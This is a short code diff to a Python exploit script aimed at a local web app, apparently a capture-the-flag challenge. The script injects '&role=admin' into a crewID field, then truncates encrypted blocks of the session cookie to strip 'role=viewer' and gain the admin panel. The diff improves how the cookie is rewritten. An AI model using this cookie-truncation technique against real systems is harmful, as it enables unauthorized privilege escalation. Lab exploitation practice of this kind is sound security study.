@@ -4,7 +4,24 @@ session = requests.Session()
 login_url = 'http://localhost:8000/requestAccess'
 
 session.post(login_url, data={'crewID': 'aa&role=admin     '})
-session.cookies.set('session', session.cookies.get('session')[:-33], domain='localhost.local') # Cut the last 2 blocks, causing the role=viewer to be removed and the role=admin from the crewID to be exposed
+
+sessionCookie = next(
+    (cookie for cookie in session.cookies if cookie.name == 'session'),
+    None,
+)
+if sessionCookie is None:
+    raise SystemExit('No session cookie returned by /requestAccess')
+
+# Drop the last 2 blocks (role=viewer), exposing the role=admin from the crewID.
+# Keep the jar's domain/path (it maps localhost to localhost.local) so requests
+# replaces the existing cookie instead of adding a duplicate.
+truncatedCookie = '.'.join(sessionCookie.value.split('.')[:-2])
+session.cookies.set(
+    'session',
+    truncatedCookie,
+    domain=sessionCookie.domain,
+    path=sessionCookie.path,
+)
 
 response = session.get('http://localhost:8000/')
 if 'Admin Panel' in response.text:
